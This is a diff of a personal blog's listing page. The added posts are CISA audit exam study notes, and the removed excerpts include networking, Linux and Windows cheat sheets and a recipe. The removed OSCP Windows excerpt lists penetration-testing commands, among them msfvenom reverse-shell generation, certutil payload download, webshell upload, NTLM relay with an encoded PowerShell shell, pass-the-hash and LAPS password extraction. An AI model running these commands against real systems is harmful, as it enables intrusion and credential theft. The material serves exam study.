@@ -179,47 +179,7 @@
     
       <article class="post on-list">
         <h2 class="post-title">
-          <a href="/posts/cheat-sheet---networking/">Cheat Sheet - Networking</a>
-        </h2>
-        <div class="post-meta"></div>
-
-        
-          <span class="post-tags">
-            
-            #<a href="/tags/tag1/">tag1</a>&nbsp;
-            
-          </span>
-        
-
-        
-
-
-        <div class="post-content">
-          
-            <hr>
-<p><strong>Network security</strong> is the practices and policies used to protect and monitor a computer network’s resources against threats and risks.</p>
-<p><strong>Client-server model</strong> is a network computing model that defines how resources and services are shared across a network. Uses a <strong><!-- raw HTML omitted -->“request and response”<!-- raw HTML omitted --></strong> method of device communication.</p>
-<p><strong>Network threats and risks</strong></p>
-<ul>
-<li>Unauthorized access into networks</li>
-<li>Denial of service (DoS) attacks</li>
-<li>Eavesdropping</li>
-<li>Data modification (eg attacker steals your data &amp; modifies without your knowledge)</li>
-</ul>
-<p><strong>Local Area Network (LAN)</strong> is a private computer network that connects devices in smaller physical areas like a room or single building, such as a small office or home network.</p>
-          
-        </div>
-
-        
-           <div>
-            <a class="read-more button inline" href="/posts/cheat-sheet---networking/">[Read more]</a>
-          </div>
-        
-      </article>
-    
-      <article class="post on-list">
-        <h2 class="post-title">
-          <a href="/posts/oscp---cheat-sheet---windows/">Cheat Sheet - OSCP Windows</a>
+          <a href="/posts/cisa---1b---is-audit-process-execution/">CISA - 1B - IS Audit Process Execution</a>
         </h2>
         <div class="post-meta"></div>
 
@@ -228,7 +188,9 @@
             
             #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
             
-            #<a href="/tags/oscp/">oscp</a>&nbsp;
+            #<a href="/tags/cisa/">cisa</a>&nbsp;
+            
+            #<a href="/tags/study/">study</a>&nbsp;
             
           </span>
         
@@ -238,371 +200,376 @@
 
         <div class="post-content">
           
-            <p>Related:
-Tags: <a href="/posts/oscp/">OSCP</a></p>
-<hr>
-<h2 id="quick-reference">Quick Reference</h2>
+            <h1 id="1---audit-project-management">1 - Audit Project Management</h1>
+<h2 id="structured-repeatable-process">Structured Repeatable Process</h2>
 <ul>
-<li><code>dir /s/b local.txt</code> - Usually <code>C:\</code> or <code>C:\users\username\desktop\</code></li>
-<li><code>dir /s/b proof.txt</code> - Usually <code>C:\Users\Administrator\Desktop\</code></li>
-<li><code>dir /s/b *.txt</code></li>
-<li>RDP: <code>xfreerdp /u:username /p:password /v:192.168.x.x /cert:ignore</code></li>
-<li>RevShell.exe: <code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168. LPORT=4444 -f exe -o revshell.exe</code></li>
-<li>Compile C: <code>/usr/bin/x86_64-w64-mingw32-gcc cfile.c -o output.exe</code></li>
-<li>Compile C#: <code>msbuild projectname.csproj</code></li>
-<li>Transfer to Windows host: <code>certutil -split -urlcache -f http://192.168.x.x/revshell.exe C:\\Users\\username\\revshell.exe</code></li>
-<li>Fix Broken Path: <code>set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;</code></li>
-<li>Windows Exploit Suggester: <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></li>
+<li>Process Flow</li>
 </ul>
-<h2 id="port-enumeration-from-kali">Port Enumeration (from Kali)</h2>
-<ul>
-<li><strong>HTTP/WebDav (80)</strong>: <code>cadaver 192.168.</code>
-<ul>
-<li>Run <code>put /usr/share/webshells/aspx/cmdasp.aspx</code> to upload command shell, then access via browser</li>
-</ul>
-</li>
-<li><strong>Kerberos (88)</strong>: <code>kerbrute userenum -d domain.name --dc 192.168. users</code></li>
-<li><strong>SMB (139/445)</strong>: <code>sudo nmap --script smb-vuln* -p 139,445 192.168.</code>
-<ul>
-<li><code>smbclient -U user \\\\192.168.</code></li>
-<li><code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.xx.xxx -c &quot;powershell -enc JABjAGwAaQBlAG4AdA...&quot;</code> (base64 powershell one-liner)
-<ul>
-<li>Kali: Call fake directory <code>dir \\192.168.xx.xxx\fake</code> for reverse shell</li>
-</ul>
-</li>
-<li>Pass the Hash: <code>smbclient \\\\192.168.xx.xxx\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b</code></li>
-</ul>
-</li>
-<li><strong>LDAP (389)</strong>: <code>sudo nmap -n -sV -Pn -script 'ldap* and not brute' 192.168.</code>
-<ul>
-<li>Domain Name found (LDAP Search): <code>ldapsearch -v -x -b 'DC=domain,DC=name' -H 'ldap://192.168.' '(objectclass=*)'</code></li>
-<li>Use credentials to find admin password <code>ldapsearch -x -H 'ldap://192.168.x.x' -D 'domain\user' -w 'userpassword' -b 'dc=domain,dc=name' &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd</code>
-<ul>
-<li>To Login <code>psexec.py domain.name/administrator: 'adminpassword'@192.168.x.x</code> to login</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="impacket">Impacket</h2>
-<p>Psexec.py - <code>/usr/share/doc/python3-impacket/examples/psexec.py</code>
-<code>impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.xx.xxx</code></p>
-          
-        </div>
-
-        
-           <div>
-            <a class="read-more button inline" href="/posts/oscp---cheat-sheet---windows/">[Read more]</a>
-          </div>
-        
-      </article>
-    
-      <article class="post on-list">
-        <h2 class="post-title">
-          <a href="/posts/cheat-sheet---linux/">Cheatsheet - Linux</a>
-        </h2>
-        <div class="post-meta"></div>
-
-        
-          <span class="post-tags">
-            
-            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
-            
-          </span>
-        
-
-        
-
-
-        <div class="post-content">
-          
-            <hr>
-<h1 id="bash">Bash</h1>
-<p><a href="https://explainshell.com/">explainshell.com</a> - Lists out meaning of a line of script
-<a href="https://linuxcommand.org/lc3_resources.php">Linux Command Resources</a> [HUGE Resource with links to more]
-<a href="https://www.kernel.org/doc/man-pages/">Linux man-pages project</a>
-<a href="https://man7.org/linux/man-pages/index.html">Linux MAN Pages</a>
-<a href="https://programminghistorian.org/en/lessons/intro-to-bash">Full “Intro to BASH” Reference</a>
-<a href="https://tldp.org/LDP/Bash-Beginners-Guide/html/Bash-Beginners-Guide.html">BASH Beginners Guide [HUGE reference]</a>
-<a href="https://www.educative.io/blog/bash-shell-command-cheat-sheet">BASH Cheat Sheet [Top 25]</a></p>
-<h2 id="core">Core</h2>
-<p><code>↑ ↓</code> - Scrolls through previous commands, <code>→</code> Completes partial path with available file/dir
-<code>CtrlC</code> - Cancels/stops your current line/command (displays as <em>^C</em>)
-<code>clear</code> Clear console, <code>reset</code> Reset console, <code>exit</code> Close console
-<code>start</code> Start argument (eg. <code>start folder_name</code> will open folder_name)
-<code>man</code> Manual &amp; options for whatever command follows it
-<code>whatis</code> Provides a shorter version of <code>man</code>
-<code>--help</code> Help for whatever command you put in front (eg. <code>ls --help</code> shows help for “ls”)
-<code>ls</code> List directory contents</p>
-          
-        </div>
-
-        
-           <div>
-            <a class="read-more button inline" href="/posts/cheat-sheet---linux/">[Read more]</a>
-          </div>
-        
-      </article>
-    
-      <article class="post on-list">
-        <h2 class="post-title">
-          <a href="/posts/cheat-sheet---windows/">Cheatsheet - Windows</a>
-        </h2>
-        <div class="post-meta"></div>
-
-        
-          <span class="post-tags">
-            
-            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
-            
-          </span>
-        
-
-        
-
-
-        <div class="post-content">
-          
-            <hr>
-<p><a href="https://www.howtogeek.com/405806/windows-task-manager-the-complete-guide/">Task Manager Complete Guide</a></p>
-<p>Free Security Tools</p>
-<ul>
-<li><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns">Autoruns</a> - Identifying startup processes</li>
-<li><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer">Process Explorer</a> - Identifying malicious processes on running systems</li>
-<li><a href="https://www.winitor.com/">Winitor/PEStudio</a> - Identifying malicious executables</li>
-<li><a href="https://marketplace.visualstudio.com/items?itemName=ms-vscode.hexeditor">Hex Editor - VisualStudio</a> - Windows Hex Editor (requires install)</li>
-<li><a href="https://www.comodo.com/home/internet-security/firewall.php">Comodo Firewall</a> - Free software firewall (with paid antivirus option)</li>
-<li><a href="https://www.bitdefender.com.au/solutions/free.html">Bitdefender Antivirus</a> - Free antivirus</li>
-<li><a href="https://bitwarden.com/">Bitwarden</a> - Open source password manager</li>
-</ul>
-<h1 id="cmd">CMD</h1>
-<p><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands">Commands for Cmd Shell &amp; PowerShell - COMPREHENSIVE</a>
-<a href="https://www.freecodecamp.org/news/command-line-commands-cli-tutorial/">Helpful Command Line Commands</a></p>
-<h2 id="core">Core</h2>
-<ul>
-<li><code>cd</code> or <code>chdir</code> Change directory (Linux = cd)</li>
-<li><code>dir</code> List directory contents (Linux = ls)</li>
-<li><code>md</code> or <code>mkdir</code> Create directory (Linux = mkdir)</li>
-<li><code>copy</code> Copy file (Linux = cp)</li>
-<li><code>move</code> Move (Cut/Paste) files (Linux = mv)</li>
-<li><code>clip</code>  Copies to Clipboard</li>
-<li><code>del</code> or <code>erase</code> Delete files/directories (Linux = rm or shred)</li>
-<li><code>rd</code> or <code>rmdir</code> Remove directory if empty (Linux = rm)</li>
-<li><code>find</code> Search a file for a specific string (Linux = grep)</li>
-<li><code>exit</code> Close CMD (Linux = exit)</li>
-<li><code>type</code> Show contents of file (Linux = cat)</li>
-<li><code>cls</code> Clear screen</li>
-<li><code>findstr</code> Find string</li>
-<li><code>clip</code> - Add to clipboard</li>
-</ul>
-<h2 id="environment-variables">Environment Variables</h2>
-<ul>
-<li><code>set</code> Shows all PC Environment Variables</li>
-<li><code>%CD%</code>	 Current Directory</li>
-<li><code>%DATE%</code> Current Date</li>
-<li><code>%OS%</code> Windows</li>
-<li><code>%ProgramFiles%</code> C:\Program Files</li>
-<li><code>%ProgramFiles(x86)%</code> C:\Program Files (x86)</li>
-<li><code>%TIME%</code> Current Time</li>
-<li><code>%USERPROFILE%</code> C:\Users{username}</li>
-<li><code>%SYSTEMDRIVE%</code> C:\</li>
-<li><code>%SYSTEMROOT%</code> C:\Windows</li>
-</ul>
-<h2 id="network">Network</h2>
-<ul>
-<li><code>ipconfig</code> IP Config (Options: /all /release /renew /displaydns /flushdns)</li>
-<li><code>getmac</code> MAC Info (Options: /v)</li>
-<li><code>netsh</code>
-<ul>
-<li><code>netsh wlan</code> show wlanreport</li>
-<li><code>netsh interface</code> show interface</li>
-<li><code>netsh interface</code> ip show address</li>
-<li><code>netsh advfirewall</code> set allprofiles state off Turn off Windows defender</li>
-</ul>
-</li>
-<li><code>ping</code> ping website.address
-<ul>
-<li>Options: <code>-t</code> (continuous pinging)</li>
-</ul>
-</li>
-<li><code>fping</code> ping multiple ip addresses at once
-<ul>
-<li>Options: <code>-g</code> (ping all IPs in the following range)</li>
-</ul>
-</li>
-<li><code>tracert</code> “trace route”
-<ul>
-<li>Options: <code>-d</code> (no domain names)</li>
-</ul>
-</li>
-<li><code>netstat</code> (Options: -o to list PIDs, -e -t 5 to show sent/recieved stats every 5 seconds)</li>
-<li><code>route</code> print [computer routing table] (add <em>to add specific route</em>, delete)</li>
-<li><code>netsh wlan show profile wifiname key=clear</code> Show saved wifi password</li>
-<li><code>nslookup</code>
-<ul>
-<li>nslookup <code>-type=ptr</code> networkname.com</li>
-</ul>
-</li>
-</ul>
-<h2 id="system-management">System Management</h2>
-<ul>
-<li><code>systeminfo</code> Provides system information</li>
-<li><code>driverquery</code> List all drivers (even drivers not in device manager)</li>
-<li><code>powercfg</code> (Option <!-- raw HTML omitted -->required<!-- raw HTML omitted -->: /energy /batteryreport)</li>
-<li><code>assoc</code> File associations
-<ul>
-<li><em>eg. assoc .mp4=vlc (Set .mp4 association to VLC)</em></li>
-</ul>
-</li>
-<li><code>chkdsk</code> Check disk
-<ul>
-<li>Options /f (error search &amp; fix) /r (check physical sectors)</li>
-</ul>
-</li>
-<li><code>sfc</code> System file check
-<ul>
-<li>Options /scannow</li>
-</ul>
-</li>
-<li><code>DISM</code> Deployment Image Servicing and Management
-<ul>
-<li>Options: /Online /Cleanup-Image /CheckHealth OR /ScanHealth OR /RestoreHealth</li>
-</ul>
-</li>
-<li><code>cipher</code> Wipe empty disk space and encrypts files</li>
-<li><code>tasklist</code> List tasks
-<ul>
-<li>tasklist | findstring script To find “script”</li>
-</ul>
-</li>
-<li><code>taskkill</code> Kill task
-<ul>
-<li>taskkill /f /pid## /f to force /pid to identify process by id#</li>
-</ul>
-</li>
-<li><code>shutdown</code>
-<ul>
-<li><code>shutdown /r /fw /f /t 0</code> (reboot into BIOS)</li>
-</ul>
-</li>
-<li><code>wmic</code> Windows Management Instrumentation Command-Line (Process management)
-<ul>
-<li><a href="https://research.nccgroup.com/2022/03/10/microsoft-announces-the-wmic-command-is-being-retired-long-live-powershell/">wmic is being replaced with Powershell</a></li>
-<li><code>wmic</code> Starts interactive mode (shell-like), commas used for multiple properties</li>
-<li>Input format: <code>wmic [global switches] [alias] [verbs] [properties]</code>
-<ul>
-<li>eg. <em>wmic /APPEND:report.txt logicaldisk get caption, filesystem, freespace</em></li>
-</ul>
-</li>
-<li><code>Global Switches</code>
-<ul>
-<li>/APPEND</li>
-</ul>
-</li>
-<li><code>Alias</code>
-<ul>
-<li>os, Logicaldisk,</li>
-</ul>
-</li>
-<li><code>verbs</code>
-<ul>
-<li>get</li>
-</ul>
-</li>
-<li><code>properties</code>
-<ul>
-<li>caption, /value, buildnumber, filesystem, freespace, size, volumeserialnumber</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><code>net</code> Manage user accounts, groups, and password policies</li>
-</ul>
-<h1 id="powershell">PowerShell</h1>
-<p><a href="https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/00-introduction?view=powershell-7.3">Powershell 101 Reference</a></p>
-          
-        </div>
-
-        
-           <div>
-            <a class="read-more button inline" href="/posts/cheat-sheet---windows/">[Read more]</a>
-          </div>
-        
-      </article>
-    
-      <article class="post on-list">
-        <h2 class="post-title">
-          <a href="/posts/meal---cheese-pull-apart-bread/">Cheese Pull Apart Bread</a>
-        </h2>
-        <div class="post-meta"></div>
-
-        
-          <span class="post-tags">
-            
-            #<a href="/tags/meal/">meal</a>&nbsp;
-            
-            #<a href="/tags/snack/">snack</a>&nbsp;
-            
-            #<a href="/tags/bread/">bread</a>&nbsp;
-            
-            #<a href="/tags/cheese/">cheese</a>&nbsp;
-            
-            #<a href="/tags/oven/">oven</a>&nbsp;
-            
-            #<a href="/tags/indulgent/">indulgent</a>&nbsp;
-            
-          </span>
-        
-
-        
-
-
-        <div class="post-content">
-          
-            <hr>
-<h1 id="ingredients">Ingredients</h1>
-<ul>
-<li>Bread loaf (sourdough or cob) - 1</li>
-<li>Mozzarella - 200g (cubed or shredded)</li>
-<li>Butter - 3 tbsp (melted)</li>
-<li>Garlic - 2 cloves (minced)</li>
-<li>Parsley (optional)</li>
-<li>Seasoning
-<ul>
-<li>Salt</li>
-<li>Pepper</li>
-</ul>
-</li>
-</ul>
-<h1 id="directions">Directions</h1>
 <ol>
-<li>Cut the bread in a crosshatch pattern (do not slice all the way through)</li>
-<li>Stuff mozzarella into the cuts throughout the loaf</li>
-<li>Mix melted butter with garlic and seasoning</li>
-<li>Pour or brush mixture over the bread, ensuring it gets into the gaps</li>
-<li>Wrap loosely in foil and bake at 180°C for 15 minutes</li>
-<li>Uncover and bake another 5–10 minutes until crispy and melted</li>
-<li>Serve immediately and pull apart</li>
+<li>Define Scope &amp; Objectives</li>
+<li>Gather Evidence</li>
+<li>Evaluate Strengths &amp; Weaknesses</li>
+<li>Form Conclusions</li>
+<li>Prepare Report</li>
+<li>Follow-Up</li>
 </ol>
-<h1 id="macros">Macros</h1>
+<p>*Exam Tip: An effective audit is managed like a formal project</p>
+<h2 id="three-phase-framework">Three-phase Framework</h2>
+<ol>
+<li>Planning Phase: Determine subject, define objective, set scope pre-audit planning, determine procedures</li>
+<li>Fieldwork &amp; Documentation Phase: Acquire data, test controls, discover &amp; validate issues, document resuts</li>
+<li>Reporting phase: Gather requirements, draft report, issue report follow-up</li>
+</ol>
+<h2 id="fieldwork--documentation-phase">Fieldwork &amp; Documentation Phase</h2>
 <ul>
-<li>Calories - 420</li>
-<li>Protein - 14g</li>
-<li>Carbs - 38g</li>
-<li>Fat - 24g</li>
-</ul>
-<h1 id="notes">Notes</h1>
+<li><strong>Acquire Data</strong>: File share, GRC tools, ect)</li>
+<li><strong>Test Controls</strong>: Apply techniques (interviews, observation, and inspection)</li>
+<li><strong>Discover &amp; Validate Issues</strong>: Identifying deviations from expected outcome (policy requirements
 <ul>
-<li>Identified based on “cheese pull” style construction</li>
-<li>Designed for visual melt/stretch rather than high-protein efficiency</li>
-<li>Best served immediately while cheese is hot and elastic</li>
+<li>Form the basis of findings</li>
 </ul>
+</li>
+<li><strong>Document Results</strong>: Recording every test, observation, and piece of evidence in work papers per organisational standards</li>
+</ul>
+<h2 id="audit-programs--work-papers">Audit Programs &amp; Work Papers</h2>
+<ul>
+<li><strong>Audit Program</strong>: Step-by-step instructions (the &ldquo;recipe&rdquo; for the audit). Formal documentation, repeatability, and meeting professional standards</li>
+<li><strong>Work Papers</strong>: Bridge between audit objectives and the final report. Must provide clear traceability from a finding back to collected evidence. Must be secure and retained based on legal &amp; organisational requirements</li>
+</ul>
+<h2 id="auditors-responsibility-regarding-fraud">Auditors Responsibility Regarding Fraud</h2>
+<ul>
+<li><strong>Management&rsquo;s Responsibility</strong>: Establish, implement and maintain internal controls to deter and detect fraud</li>
+<li><strong>Auditor&rsquo;s Responsiblity</strong>: Exercise professional care, be alert to opportunities or indicators of fraud, and have knowledge of common fraud indicators</li>
+<li><strong>Auditor&rsquo;s Action</strong>: Communicate the need for a detailed investigation to appropriate authorities if fraud is suspected</li>
+</ul>
+<h2 id="agile-auditing">Agile Auditing</h2>
+<ul>
+<li><strong>Traditional (Waterfall) Audit</strong>: Used for regulatory compliance, large-scale audits
+<ul>
+<li>Structure: Plan - &gt; Fieldwork - &gt; Report</li>
+</ul>
+</li>
+<li><strong>Agile Audit</strong>: Suited to continuous or IT operations. Iterative, collaborative, and responsive to change. Blurs line between planning &amp; fieldwork. Focuses on:
+<ul>
+<li>Individuals &amp; interactions over processes and tools</li>
+<li>Customer (auditee) collaboration over contract negotiation</li>
+<li>Responding to change over following a rigid plan</li>
+</ul>
+</li>
+</ul>
+<h2 id="agile-development-model">Agile development Model</h2>
+<ul>
+<li><strong>Sprint Planning</strong>: 1-2 week planning development, testing, demonstration</li>
+</ul>
+<h2 id="key-benefits-of-agile-auditing">Key Benefits of Agile Auditing</h2>
+<ul>
+<li><strong>Reduced Planning Time</strong>: Sprints condense planning</li>
+<li><strong>Streamlined Engagements</strong>: Planning, fieldwork and reporting combined into single cohesive engagement</li>
+<li><strong>Direct Customer Collaboration</strong>: Auditee is part of the process (daily &ldquo;scrum&rdquo; meetings)</li>
+<li><strong>Flexible Scope</strong>: Allows for real-time adjustments as new information is discovered</li>
+<li><strong>Real-time assurance</strong>: Findings are communicated as they&rsquo;re discovered, not held for the final report</li>
+</ul>
+<h1 id="2---sampling-methodology">2 - Sampling Methodology</h1>
+<h2 id="why-sample">Why Sample?</h2>
+<ul>
+<li>Time and cost often preclude 100% verification
+<ul>
+<li>Goal: Infer characteristics about whole population from representative sample</li>
+</ul>
+</li>
+<li>Two Main Purposes
+<ul>
+<li>Compliance Testing: Are controls working as designed?</li>
+<li>Substansive Testing: Data and transactions accurate &amp; valid</li>
+</ul>
+</li>
+</ul>
+<h2 id="compliance-v-substansive-testing">Compliance v Substansive Testing</h2>
+<ul>
+<li><strong>Compliance Testing</strong>: Controls being applied consistently and effectively?
+<ul>
+<li>Example: Select 30 change requests to verify each has managers approval signature</li>
+<li>Focused on *<em>the process</em></li>
+</ul>
+</li>
+<li><strong>Substantive Testing</strong>: Any monetary errors or data integrity issues in the final data
+<ul>
+<li>Example: Recalculate interest on a sample of 50 loans to verify accuracy of total interest income reported</li>
+<li>Focused on <strong>the outcome and data</strong></li>
+</ul>
+</li>
+</ul>
+<p>If <strong>Compliance Testing</strong> shows controls are strong and reliable, the auditor can justify reducing <em>Substansive testing</em></p>
           
         </div>
 
         
            <div>
-            <a class="read-more button inline" href="/posts/meal---cheese-pull-apart-bread/">[Read more]</a>
+            <a class="read-more button inline" href="/posts/cisa---1b---is-audit-process-execution/">[Read more]</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h2 class="post-title">
+          <a href="/posts/cisa---2a---governance/">CISA - 2A - Governance</a>
+        </h2>
+        <div class="post-meta"></div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+            
+            #<a href="/tags/study/">study</a>&nbsp;
+            
+            #<a href="/tags/cisa/">cisa</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h1 id="1---laws-regulations-and-industry-standards">1 - Laws, Regulations, and Industry Standards</h1>
+<h2 id="external-environment">External Environment</h2>
+<ul>
+<li><strong>Key Focus Areas</strong>
+<ul>
+<li>Data Privacy and Protection (GDPR, HIPAA)</li>
+<li>Intellectual Property (IP)</li>
+<li>Reliability of financial information (SOX)</li>
+<li>Compliance requirements can have global reach
+<em>Exam Tip: Don&rsquo;t need to know law specifics, but must understand that these external requirements shape the control environment</em></li>
+</ul>
+</li>
+</ul>
+<h2 id="auditors-role-in-compliance">Auditor&rsquo;s Role in Compliance</h2>
+<p>Verify the process of compliance is effective.
+Audit Checklist</p>
+<ul>
+<li>Does the enterprise identify all applicable laws?</li>
+<li>Is the responsibility for compliance assigned to senior personnel?</li>
+<li>Is there a process for monitoring, auditing, and enforcing compliance?</li>
+</ul>
+<p><em>Exam Tip: Focus on the auditor&rsquo;s role in verifying the existence and effectiveness of a compliance framework</em></p>
+          
+        </div>
+
+        
+           <div>
+            <a class="read-more button inline" href="/posts/cisa---2a---governance/">[Read more]</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h2 class="post-title">
+          <a href="/posts/cisa---2b---it-management/">CISA - 2B - IT Management</a>
+        </h2>
+        <div class="post-meta"></div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+            
+            #<a href="/tags/study/">study</a>&nbsp;
+            
+            #<a href="/tags/cisa/">cisa</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h1 id="1---it-resource-management">1 - IT Resource Management</h1>
+<p>The effective and efficient management of all IT resources: people, technology, and finances to achieve enterprise goals</p>
+<ul>
+<li><strong>IT Portfolio Management</strong>: Ensure the enterprise is pursuing the best mix of IT projects to achieve its goals, with a focus on being a strategic process to decide where to invest, continue investing, or divest, based on value and strategic alignment</li>
+<li><strong>Business Case</strong>: A formal, documented justification is required for all significant projects, even those that are mandatory for regulatory compliance
+<ul>
+<li>Used to evaluate results against the original plan after completion</li>
+</ul>
+</li>
+</ul>
+<h2 id="hr-management---hiring--onboarding">HR Management - Hiring &amp; Onboarding</h2>
+<ul>
+<li><strong>Key Hiring Controls</strong>
+<ul>
+<li>Background checks</li>
+<li>Confidentiality &amp; NDAs</li>
+<li>Disclosure of Conflict of Interest</li>
+<li>Codes of Professional Conduct/Ethics</li>
+</ul>
+</li>
+<li><strong>Employee Handbook</strong>: Explains security policies, acceptable conduct, and company expectations
+<ul>
+<li>Note: This is a source of information, not a control itself</li>
+</ul>
+</li>
+</ul>
+<h2 id="hr-management---during-employment">HR Management - During Employment</h2>
+<ul>
+<li><strong>Objective</strong>: Manage performance and mitigate insider risk</li>
+<li><strong>Performance Management</strong>: SMART Goals</li>
+<li><strong>Training &amp; Development</strong>
+<ul>
+<li>Ongoing training is critical due to the pace of technology changes</li>
+<li>Cross-training reduces dependency and provides backup
+<ul>
+<li>Risk assessment is required to ensure it doesn&rsquo;t create a new risk by giving one person too much knowledge (avoid SoD concern)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Key Detective Controls</strong>
+<ul>
+<li>Required Vacations &amp; Job Rotation: Uncovers fraudulent acts original employee was concealing</li>
+</ul>
+</li>
+</ul>
+<h2 id="hr-management---termination">HR Management - Termination</h2>
+<ul>
+<li><strong>Objective</strong>: Protect enterprise assets and data when an employee separates</li>
+<li><strong>Termination policies</strong>: must be clearly defined for voluntary and involuntary separation
+<ul>
+<li>Involuntary brings additional risks
+<em>Exam Tip: Same access revocation and reissue process should apply to employees transferring to a different department (role change is a job change)</em></li>
+</ul>
+</li>
+<li><strong>Critical Control Procedures</strong> (Offboarding checklist)
+<ul>
+<li>Return of all assets</li>
+<li>Immediate revocation of access (including network, cloud, app-specific, ect)</li>
+<li>Notification: Alert relevant staff and security personnel (Failure to notify may delay revocation of access)</li>
+</ul>
+</li>
+</ul>
+<h2 id="financial-management-practices">Financial Management Practices</h2>
+<ul>
+<li><strong>Cost Allocation (Charge back)</strong>: Process where costs of IT services are allocated back to the business functions that use them (makes business units more aware of IT costs and encourages efficient use)</li>
+<li><strong>IT Budgets</strong>: Must lnk spending to short-term projects and long-term strategic objectives</li>
+</ul>
+<p><em>Exam Tip: ISACA perceives that IT and Security functions exist to serve the business</em></p>
+          
+        </div>
+
+        
+           <div>
+            <a class="read-more button inline" href="/posts/cisa---2b---it-management/">[Read more]</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h2 class="post-title">
+          <a href="/posts/cisa---3a---is-acquisition-and-development/">CISA - 3A - IS Acquisition and Development</a>
+        </h2>
+        <div class="post-meta"></div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="/tags/study/">study</a>&nbsp;
+            
+            #<a href="/tags/cisa/">cisa</a>&nbsp;
+            
+            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h1 id="1---project-governance-and-management">1 - Project Governance and Management</h1>
+<ul>
+<li><strong>Initiating</strong>: High level objectives and securing approvals, documented in project charter</li>
+<li><strong>Planning</strong>: Develop detailed roadmap, defining scope setting a budget, establishing a timeline and identifying potential risks</li>
+<li><strong>Executing</strong>: The &ldquo;Doing&rdquo; phase. The team performs the work defined in the plan to create the project deliverables</li>
+<li><strong>Controlling and Monitoring</strong>: Tracking the projects progress and changes in scope/schedule, running alongside execution phase</li>
+<li><strong>Closing</strong>: Project formally finalised and completed. Final deliverables approved by the client, closing out contracts, documenting lessons learned.</li>
+</ul>
+<h2 id="project-governance-vs-managment">Project Governance vs Managment</h2>
+<ul>
+<li><strong>Project Governance</strong>: Sets the <em>direction</em> and provides oversight. Oversight framework typically performed by a Steering Committee for how project decisions are made so they align with the business strategy an risk appetite.</li>
+<li><strong>Project Management</strong>: Executes the <em>plan</em> efficiently. Executing the plan to achieve project goals, performed by a Project Manager.</li>
+<li><strong>Project Portfolio Management</strong>: Centralised management of all projects to ensure prioritisation and strategic business objective alignment</li>
+</ul>
+<p><em>Exam Tip: The IT Steering Committee is the group responsible for prioritising project requests and providing overall governance</em></p>
+          
+        </div>
+
+        
+           <div>
+            <a class="read-more button inline" href="/posts/cisa---3a---is-acquisition-and-development/">[Read more]</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h2 class="post-title">
+          <a href="/posts/cisa---3b---is-implementation/">CISA - 3B - IS Implementation</a>
+        </h2>
+        <div class="post-meta"></div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+            
+            #<a href="/tags/cisa/">cisa</a>&nbsp;
+            
+            #<a href="/tags/study/">study</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h1 id="1---testing-methodologies">1 - Testing Methodologies</h1>
+<ul>
+<li><strong>1. Unit Testing</strong>: Individual program module (by developers)</li>
+<li><strong>2. Integration Testing</strong>: Testing connection and data flow between modules</li>
+<li><strong>3. System Testing</strong>: Testing entire integrated system to verify it meets technical and functional requirements (by test team in non-prod environment)
+<ul>
+<li><strong>Recovery Testing</strong>: Check systems ability to recover after failure</li>
+<li><strong>Security Testing</strong>: Verify access controls and no new security holes introduced</li>
+<li><strong>Load, Volume and Stress Testing</strong>
+<ul>
+<li>Load: Performance with large data quantity (peak hours)</li>
+<li>Volume: Maximum volume of records the system can handle</li>
+<li>Stress: Maximum number of concurrent users the system can handle</li>
+</ul>
+</li>
+<li><strong>Performance Testing</strong>: Testing system against benchmarks</li>
+</ul>
+</li>
+<li><strong>4. Acceptance Testing</strong>: Final gate before implementation, users validate system meets business needs
+<ul>
+<li><strong>Quality Assurance Testing (QAT)</strong>: &ldquo;Did we build the system right?&rdquo;. Focused on technical aspects, performed by IT department, Verify it works as documented and to all tech specs</li>
+<li><strong>User Acceptance testing (UAT)</strong>: &ldquo;Did we build the right system&rdquo;. Focused on functional aspects and business readiness, performed by business users, ensure system is production-ready and meets business requirements from user perspective (This is the <em><strong>final sign-off</strong></em>)</li>
+</ul>
+</li>
+</ul>
+<p><em>Exam Tip: UAT is the most critical milestone before implementation, and <strong>business users</strong> give final approval not the IT department</em></p>
+          
+        </div>
+
+        
+           <div>
+            <a class="read-more button inline" href="/posts/cisa---3b---is-implementation/">[Read more]</a>
           </div>
         
       </article>
